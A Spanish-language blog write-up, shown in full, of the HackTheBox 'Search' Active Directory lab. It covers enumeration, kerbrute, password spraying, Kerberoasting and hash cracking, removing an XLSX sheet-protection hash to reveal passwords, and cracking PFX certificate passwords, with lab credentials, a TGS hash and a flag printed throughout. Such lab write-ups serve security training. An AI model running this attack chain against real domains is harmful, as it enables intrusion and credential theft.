---
layout: post
title: Search
date: 2023-02-04
description:
img:
fig-caption:
tags: [OSCP, OSEP]
---
___

<center><img src="/writeups/assets/img/Search-htb/Search_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* Enumeración por LDAP

* Enumeración por RPC

* Enumeración con BloodHound

* Kerberoasting Attack

* Password Spraying

* Information Disclosure

* Bypass protecciones archivo XLSX

* Desencriptación de certificado PFX

* Uso de Windows Powershell Web Access

* Bypass AMSI (Corrompiendo la tarea)

* Abuso de privilegio ReadGMSAPassword (Escalada de Privilegios)

* Abuso de privilegio GenericAll (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.129 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-04 14:11 GMT
Nmap scan report for 10.10.11.129
Host is up (0.28s latency).
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
8172/tcp  open  unknown
9389/tcp  open  adws
49667/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49695/tcp open  unknown
49707/tcp open  unknown
49719/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 55.12 seconds

```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389,49667,49675,49676,49695,49707,49719 10.10.11.129 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-04 14:13 GMT
Nmap scan report for 10.10.11.129
Host is up (0.23s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &mdash; Just Testing IIS
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-04 14:13:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2023-02-04T14:14:59+00:00; -2s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: 2023-02-04T14:14:59+00:00; -1s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2023-02-04T14:14:59+00:00; -1s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-04T14:14:59+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2023-02-04T14:14:59+00:00; -1s from scanner time.
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Not valid before: 2020-04-07T09:05:25
|_Not valid after:  2030-04-05T09:05:25
|_http-title: Site doesn't have a title.
|_ssl-date: 2023-02-04T14:14:58+00:00; -2s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-02-04T14:14:06
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 128.65 seconds
```

## Puerto 445 (SMB)

Con crackmapexec, aplico un escaneo para ver el dominio, hostname y versiones

```null
crackmapexec smb 10.10.11.129
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
```

Agrego el dominio al /etc/hosts

No tengo permisos para ver los recursos compartidos

```null
smbmap -H 10.10.11.129 -u 'null'
[!] Authentication error on 10.10.11.129
```

## Puerto 53 (DNS)

Con dig realizo consultas DNS y encuentro un subdominio en base a los name services

```null
dig @10.10.11.129 search.htb ns

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.11.129 search.htb ns
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12626
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;search.htb.			IN	NS

;; ANSWER SECTION:
search.htb.		3600	IN	NS	research.search.htb.

;; ADDITIONAL SECTION:
research.search.htb.	3600	IN	A	10.10.11.129
research.search.htb.	3600	IN	AAAA	dead:beef::20e
research.search.htb.	3600	IN	AAAA	dead:beef::307d:3e26:2292:b7a2

;; Query time: 260 msec
;; SERVER: 10.10.11.129#53(10.10.11.129) (UDP)
;; WHEN: Sat Feb 04 14:17:44 GMT 2023
;; MSG SIZE  rcvd: 134
```

Enumerando los servidores de correo se filtra otro

```null
dig @10.10.11.129 search.htb mx

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.11.129 search.htb mx
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 64479
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;search.htb.			IN	MX

;; AUTHORITY SECTION:
search.htb.		3600	IN	SOA	research.search.htb. hostmaster.search.htb. 435 900 600 86400 3600

;; Query time: 152 msec
;; SERVER: 10.10.11.129#53(10.10.11.129) (UDP)
;; WHEN: Sat Feb 04 14:18:31 GMT 2023
;; MSG SIZE  rcvd: 95
```

Los añado al /etc/hosts

## Puerto 80 (HTTP)

Con whatweb, escaneo las tecnologías que está empleando el servidor web

```null
 whatweb http://10.10.11.129
http://10.10.11.129 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[youremail@search.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.129], JQuery[3.3.1], Microsoft-IIS[10.0], Script, Title[Search &mdash; Just Testing IIS], X-Powered-By[ASP.NET]
```

La página principal se ve así:

<img src="/writeups/assets/img/Search-htb/1.png" alt="">

La sección de mensajes no está funcional

<img src="/writeups/assets/img/Search-htb/2.png" alt="">

Se pueden ver posibles usuarios válidos

<img src="/writeups/assets/img/Search-htb/3.png" alt="">

Los almaceno dentro de un archivo

```null
cat users
Keely Lyons
Dax Santiago
Sierra Frye
Kyla Stewart
Kaiara Spencer
Dave Simpson
Ben Thompson
```

Con spindrift, creo un diccionario con todas las posibles combinaciones

```null
python3 spindrift.py /home/rubbx/Desktop/HTB/Machines/Search/users --format {first}.{last} > bruteusers
python3 spindrift.py /home/rubbx/Desktop/HTB/Machines/Search/users --format {f}.{last} >> bruteusers
python3 spindrift.py /home/rubbx/Desktop/HTB/Machines/Search/users --format {f}{last} >> bruteusers
python3 spindrift.py /home/rubbx/Desktop/HTB/Machines/Search/users --format {first}{l} >> bruteusers
python3 spindrift.py /home/rubbx/Desktop/HTB/Machines/Search/users --format {first}.{l} >> bruteusers
```

Valido a los usuarios con kerbrute

```null
kerbrute userenum -d search.htb --dc 10.10.11.129 bruteusers

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 02/04/23 - Ronnie Flathers @ropnop

2023/02/04 14:58:12 >  Using KDC(s):
2023/02/04 14:58:12 >  	10.10.11.129:88

2023/02/04 14:58:12 >  [+] VALID USERNAME:	sierra.frye@search.htb
2023/02/04 14:58:12 >  [+] VALID USERNAME:	keely.lyons@search.htb
2023/02/04 14:58:12 >  [+] VALID USERNAME:	dax.santiago@search.htb
2023/02/04 14:58:14 >  [+] VALID USERNAME:	hope.sharp@search.htb
2023/02/04 14:58:14 >  Done! Tested 36 usernames (4 valid) in 2.386 seconds
```

Dentro de una imagen de la web hay una contraseña y otro usuario, que añado al diccionario

<img src="/writeups/assets/img/Search-htb/4.png" alt="">

Efectúo un password spraying con los usuarios que ya tengo

```null
crackmapexec smb 10.10.11.129 -u valid_users -p 'IsolationIsKey?'
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\keely.lyons:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\dax.santiago:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\sierra.frye:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
```

Teniendo credenciales válidas puedo tratar de dumpear datos por LDAP

```null
mkdir ld; cd ld; ldapdomaindump -u 'search.htb\hope.sharp' -p 'IsolationIsKey?' 10.10.11.129
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

Me monto un servicio HTTP con python y desde el navegador puedo ver todos los usuarios del directorio activo y el grupo al que pertenecen

<img src="/writeups/assets/img/Search-htb/5.png" alt="">

El usuario tristan.davies pertenece al grupo Domain Admins

<img src="/writeups/assets/img/Search-htb/6.png" alt="">

Lanzo el un ingestor de BloodHound para encontrar formas de escalar privilegios

```null
bloodhound-python -c All -d search.htb -u hope.sharp@search.htb -p 'IsolationIsKey?' -ns 10.10.11.129
```

Importo los datos y veo que el usuario web_svc es kerberoasteable

<img src="/writeups/assets/img/Search-htb/7.png" alt="">

Obtengo su TGS

```null
GetUserSPNs.py search.htb/hope.sharp:'IsolationIsKey?' -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 12:59:11.329031  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$207cd5eceeecff9f13668ceb3ff6d22e$b84e91ec3e58be3ceb63a3c75095e9b65640971bdd5320f3a580cb90011b78d7e3d395241df889b2bcdca56da31b6cf9f8587e350580c9aca4a8b6de3459d31b758f1e2f40a590f04987ad8ec6591c484ed182cad265ba12525b03156cadf884555f176d0cfe4a2abfe8e9d80e8fb84d82ed9530bb81a42ba6a7bcdb29abd2ddcf9e68ca82af0866533c71fc8e08a7fd568b4f9176e7f6ae8310efbae3eeee3322cd274ee43b004cf3c9492a4c7534b01689e545cad0329adfbb9acd5d85ef8e3bdf2891af381707619ec301355232a05194adfa93680b44fea7cfded422216677c6074543dc0fdd4f66af5dd3fe5aa115882d7ce89ebdbad3bc57bd08eeb5240d28b868c60aa0b76fdf0a0ebd10fd6d49ba0fdbf79b628536fe43b702b161e70b44b989e8a700d05c17dce2da9246fb7024fadeeb8f51a78206b201d27babf2931b8497a9dd32332acb3472c420a6ddb19634cf5541eb16d6cbfb67a8762ff85c241223edf5bb69d1a9c0d416c320f95c0a9e359b493f3d1c8ac0ed68df5847b73ca6432d73f1a13e03460aefd2cea543dca8b1ad78587b534e84774535fae0081764ab9a08f72d22a5e6b5ddfe19d1f0936e22a3eccabd550ec23ce33c48e7734c86d5a94abab4e3efc66670931ca6939bcf4fc4786edf4e6c4d834c4a22e9c9cc7d5c9156d6cdbf32252c2f40b146aa907a5cf464df5fd4b023d9dd13b7164e66ed1b6d754298240f073585ca7ac77fbb13ef49c191d529ad1e7867a4a1b952c97227498665871fa9854f4e5fece5ae5406a4d6c09faed44b31ed662eede072afad53d25f663b349f2e40058dfc609cc7de8c220cbea3d89f5e7c164981e167a65f5107cb81f10a08efa18af691613b98f0a6da8089afe632dbf20e9e2335da35e0c8b4f1ddbd5a985d84147d86c939581573189977e51191aeb86e12e3dc8eb534a8b0542ee7e1fd4d72b648af51c2ee935d6e9e79937e1d02a1c8c6f10dbb17fec63aad3cfcdb128f3fa8e45fd0da3eee2362b1f17384e9d50164b63041fedde744431849ee8b48a797cedadd51fb81e0b739f6ce8c94d6e46bbeb2608593ef453006359ff905df579bac36d068e44b606e69f491f9c7aa8145658a3192c958d333f0f7141f2833927f956b492b010cc4b2da790c4a1027eeeb25553d4a8e424189b3793e03b0764f804e1586082a550ff8a66cfae0e4cbae0ac6cdc8df251359f386019f7a3dd0330f6ba94e8cba8d908c1131449746cf2de9da3bc4380e1a2bfbc1d6eec376382ff4c59ce16d0a7f61320d0e350ab587bad2600e1c287cb9bf83b953a1b309f53fef55b83b90a03921cbc05419a3ac82d53b0dabc1de91c0c68a0aa7d37cbc4b4eb64187e954a1455c812a91724452595adcc9e26f1cc0c0872f05641644f4ba772cd5bf1b7b87528dd633e9cfaf1faf5fa87e6222ba040004962f587a0c177e51d47ac31752a2c82fa4d4
```

Intento crackearlo con john

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
@3ONEmillionbaby (?)     
1g 0:00:00:04 DONE (2023-02-04 15:28) 0.2061g/s 2369Kp/s 2369Kc/s 2369KC/s @4208891ncv..@#alexandra$&
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Encuentra la contraseña. Puedo probar a reutilizarla para otros usuarios. Me autentico al servicio RPC y añado al diccionario que tenía todos los usuarios del directorio activo

```null
rpcclient -U "hope.sharp%IsolationIsKey?" 10.10.11.129 -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v "0x" | tr -d "[]" > users
```

Es el caso

```null
crackmapexec smb 10.10.11.129 -u users -p '@3ONEmillionbaby' --continue-on-success | grep -v "-"
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Edgar.Jacobs:@3ONEmillionbaby 
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\web_svc:@3ONEmillionbaby 
```

Puedo listar los recursos compartidos para ambos usuarios, aunque coinciden

```null
smbmap -H 10.10.11.129 -u 'Edgar.Jacobs' -p '@3ONEmillionbaby'
[+] IP: 10.10.11.129:445	Name: search.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	RedirectedFolders$                                	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share 

smbmap -H 10.10.11.129 -u 'hope.sharp' -p 'IsolationIsKey?'
[+] IP: 10.10.11.129:445	Name: search.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	RedirectedFolders$                                	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share 
```

Dentro de CertEnroll hay certificados relacionados con Microsoft Active Directory Certificate Services

```null
smbmap -H 10.10.11.129 -u 'hope.sharp' -p 'IsolationIsKey?' -r 'CertEnroll'
[+] IP: 10.10.11.129:445	Name: search.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	CertEnroll                                        	READ ONLY	
	.\CertEnroll\*
	dr--r--r--                0 Sat Feb  4 14:10:00 2023	.
	dr--r--r--                0 Sat Feb  4 14:10:00 2023	..
	fr--r--r--              330 Tue Apr  7 07:29:31 2020	nsrev_search-RESEARCH-CA.asp
	fr--r--r--              883 Tue Apr  7 07:29:29 2020	Research.search.htb_search-RESEARCH-CA.crt
	fr--r--r--              735 Sat Feb  4 14:10:00 2023	search-RESEARCH-CA+.crl
	fr--r--r--              931 Sat Feb  4 14:10:00 2023	search-RESEARCH-CA.crl
```

Existe el directorio CertEnroll en el servidor web

```null
gobuster dir -u http://10.10.11.129 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/IIS.fuzz.txt -t 50
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.129
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/IIS.fuzz.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/02/04 15:52:35 Starting gobuster in directory enumeration mode
===============================================================
//certenroll/         (Status: 403) [Size: 1233]
[ERROR] 2023/02/04 15:52:36 [!] parse "http://10.10.11.129//%NETHOOD%/": invalid URL escape "%NE"
//images/             (Status: 403) [Size: 1233]
//<script>alert('XSS')</script>.aspx (Status: 400) [Size: 3420]
//~/<script>alert('XSS')</script>.aspx (Status: 400) [Size: 3420]
//certsrv/mscep_admin (Status: 401) [Size: 1293]
//certsrv/mscep/mscep.dll (Status: 401) [Size: 1293]
Progress: 210 / 211 (99.53%)
//certsrv/            (Status: 401) [Size: 1293]
```

Pero no tengo acceso

<img src="/writeups/assets/img/Search-htb/8.png" alt="">

En /certsrv tengo que proporcionar credenciales

<img src="/writeups/assets/img/Search-htb/9.png" alt="">

Pero como el puerto 5986 no está abierto, no tiene sentido que genere certificados para conectarme

En el escritorio de edgar.jacobs hay un documento de excel

```null
smbmap -H 10.10.11.129 -u 'Edgar.Jacobs' -p '@3ONEmillionbaby' -r 'RedirectedFolders$/edgar.jacobs/Desktop'
[+] IP: 10.10.11.129:445	Name: search.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	RedirectedFolders$                                	READ, WRITE	
	.\RedirectedFolders$edgar.jacobs\Desktop\*
	dw--w--w--                0 Mon Aug 10 10:02:16 2020	.
	dw--w--w--                0 Mon Aug 10 10:02:16 2020	..
	dr--r--r--                0 Thu Apr  9 20:05:29 2020	$RECYCLE.BIN
	fr--r--r--              282 Mon Aug 10 10:02:16 2020	desktop.ini
	fr--r--r--             1450 Thu Apr  9 20:05:03 2020	Microsoft Edge.lnk
	fr--r--r--            23130 Mon Aug 10 10:30:05 2020	Phishing_Attempt.xlsx
```

Me lo descargo para abrilo con Libreoffice

```null
smbmap -H 10.10.11.129 -u 'Edgar.Jacobs' -p '@3ONEmillionbaby' --download 'RedirectedFolders$/edgar.jacobs/Desktop/Phishing_Attempt.xlsx'
[+] Starting download: RedirectedFolders$\edgar.jacobs\Desktop\Phishing_Attempt.xlsx (23130 bytes)
[+] File output to: /home/rubbx/Desktop/HTB/Machines/Search/10.10.11.129-RedirectedFolders_edgar.jacobs_Desktop_Phishing_Attempt.xlsx

mv /home/rubbx/Desktop/HTB/Machines/Search/10.10.11.129-RedirectedFolders_edgar.jacobs_Desktop_Phishing_Attempt.xlsx Desktop_Phishing_Attempt.xlsx
```

La columna "C" está oculta

<img src="/writeups/assets/img/Search-htb/10.png" alt="">

Para burlar la contraseña que pide para verla, puedo descomprimir el documento y borrar el hash que la protege o cambiarlo por uno que conozca creado por mí

```null
unzip Desktop_Phishing_Attempt.xlsx
```

Tienen la siguiente estructura

```null
tree
.
├── [Content_Types].xml
├── Desktop_Phishing_Attempt.xlsx
├── docProps
│   ├── app.xml
│   └── core.xml
├── _rels
└── xl
    ├── calcChain.xml
    ├── charts
    │   ├── chart1.xml
    │   ├── colors1.xml
    │   ├── _rels
    │   │   └── chart1.xml.rels
    │   └── style1.xml
    ├── drawings
    │   ├── drawing1.xml
    │   └── _rels
    │       └── drawing1.xml.rels
    ├── printerSettings
    │   ├── printerSettings1.bin
    │   └── printerSettings2.bin
    ├── _rels
    │   └── workbook.xml.rels
    ├── sharedStrings.xml
    ├── styles.xml
    ├── theme
    │   └── theme1.xml
    ├── workbook.xml
    └── worksheets
        ├── _rels
        │   ├── sheet1.xml.rels
        │   └── sheet2.xml.rels
        ├── sheet1.xml
        └── sheet2.xml

12 directories, 22 files
```

Dentro de los worksheets, se encuentra el atributo que me impide ver la columna

```null
<sheetProtection algorithmName="SHA-512" hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg=="
```

Vuelvo a comprimirlo y al abrirlo con Libreoffice puedo ver contraseñas

```null
zip -r Desktop_Phishing_Attempt.xlsx *
```

<img src="/writeups/assets/img/Search-htb/11.png" alt="">

Las valido con crackmapexec

```null
crackmapexec smb 10.10.11.129 -u users -p passwords --continue-on-success --no-bruteforce | grep -v "-"
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18 
```

Me voy al BloodHound y lo marco como pwneado y veo que tiene una propiedad de la que puedo abusar para escalar privilegios

<img src="/writeups/assets/img/Search-htb/12.png" alt="">

El usuario Sierra.Frye, miembro del grupo birmingham-itsec, que está dentro de itsec, tiene ReadGMSAPassword sobre el Account System bir-adfs-gmsa. En el panel de ayuda de BloodHound se puede ver el vector de explotación

<img src="/writeups/assets/img/Search-htb/13.png" alt="">

Pero antes, puedo tratar de ver los recursos compartidos del directorio personal de este usuario, según pude comprobar con el resto a través del SMB

```null
smbmap -H 10.10.11.129 -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' -r 'RedirectedFolders$/Sierra.Frye'
[+] IP: 10.10.11.129:445	Name: search.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	RedirectedFolders$                                	READ, WRITE	
	.\RedirectedFolders$Sierra.Frye\*
	dr--r--r--                0 Thu Nov 18 01:01:45 2021	.
	dr--r--r--                0 Thu Nov 18 01:01:45 2021	..
	dw--w--w--                0 Thu Nov 18 01:08:17 2021	Desktop
	dw--w--w--                0 Fri Jul 31 14:42:19 2020	Documents
	dw--w--w--                0 Fri Jul 31 14:45:36 2020	Downloads
	fr--r--r--               33 Thu Nov 18 01:01:45 2021	user.txt

```

Puedo visualizar la primera flag

```null
mbmap -H 10.10.11.129 -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' --download 'RedirectedFolders$/Sierra.Frye/user.txt'
[+] Starting download: RedirectedFolders$\Sierra.Frye\user.txt (33 bytes)
[+] File output to: /home/rubbx/Desktop/HTB/Machines/Search/Document/10.10.11.129-RedirectedFolders_Sierra.Frye_user.txt
mv /home/rubbx/Desktop/HTB/Machines/Search/Document/10.10.11.129-RedirectedFolders_Sierra.Frye_user.txt user.txt
cat user.txt
64879e289376d725df7bb6e96893d0b8
```

Encuentro un directorio de Backups

```null
smbmap -H 10.10.11.129 -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' -r 'RedirectedFolders$/Sierra.Frye/Downloads'
[+] IP: 10.10.11.129:445	Name: search.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	RedirectedFolders$                                	READ, WRITE	
	.\RedirectedFolders$Sierra.Frye\Downloads\*
	dw--w--w--                0 Fri Jul 31 14:45:36 2020	.
	dw--w--w--                0 Fri Jul 31 14:45:36 2020	..
	dr--r--r--                0 Thu Jul 30 17:25:57 2020	$RECYCLE.BIN
	dr--r--r--                0 Mon Aug 10 20:39:17 2020	Backups
	fr--r--r--              282 Fri Jul 31 14:42:18 2020	desktop.ini
```

Dentro hay unos certificados

```null
smbmap -H 10.10.11.129 -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' -r 'RedirectedFolders$/Sierra.Frye/Downloads/Backups'
[+] IP: 10.10.11.129:445	Name: search.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	RedirectedFolders$                                	READ, WRITE	
	.\RedirectedFolders$Sierra.Frye\Downloads\Backups\*
	dr--r--r--                0 Mon Aug 10 20:39:17 2020	.
	dr--r--r--                0 Mon Aug 10 20:39:17 2020	..
	fr--r--r--             2643 Fri Jul 31 15:04:11 2020	search-RESEARCH-CA.p12
	fr--r--r--             4326 Mon Aug 10 20:39:17 2020	staff.pfx
```

Los descargo a mi equipo

```null
smbmap -H 10.10.11.129 -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' --download 'RedirectedFolders$/Sierra.Frye/Downloads/Backups/search-RESEARCH-CA.p12'
[+] Starting download: RedirectedFolders$\Sierra.Frye\Downloads\Backups\search-RESEARCH-CA.p12 (2643 bytes)
[+] File output to: /home/rubbx/Desktop/HTB/Machines/Search/Document/10.10.11.129-RedirectedFolders_Sierra.Frye_Downloads_Backups_search-RESEARCH-CA.p12

mv /home/rubbx/Desktop/HTB/Machines/Search/Document/10.10.11.129-RedirectedFolders_Sierra.Frye_Downloads_Backups_search-RESEARCH-CA.p12 search-RESEARCH-CA.p12

smbmap -H 10.10.11.129 -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' --download 'RedirectedFolders$/Sierra.Frye/Downloads/Backups/staff.pfx'
[+] Starting download: RedirectedFolders$\Sierra.Frye\Downloads\Backups\staff.pfx (4326 bytes)
[+] File output to: /home/rubbx/Desktop/HTB/Machines/Search/Document/10.10.11.129-RedirectedFolders_Sierra.Frye_Downloads_Backups_staff.pfx

mv /home/rubbx/Desktop/HTB/Machines/Search/Document/10.10.11.129-RedirectedFolders_Sierra.Frye_Downloads_Backups_staff.pfx staff.pfx
```

Busco en Google referencias sobre este tipo de archivos y, al parecer, están relacionados con Firefox

<img src="/writeups/assets/img/Search-htb/14.png" alt="">

Lo intento importar, pero me pide contraseña

<img src="/writeups/assets/img/Search-htb/15.png" alt="">

Creo un hash para intentar crackearlo

```null
pfx2john staff.pfx > hash

john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
misspissy        (staff.pfx)     
1g 0:00:01:21 DONE (2023-02-04 17:09) 0.01227g/s 67319p/s 67319c/s 67319C/s misssnail..missnona16
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

pfx2john search-RESEARCH-CA.p12 > hash2
john -w:/usr/share/wordlists/rockyou.txt hash2
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
misspissy        (search-RESEARCH-CA.p12)     
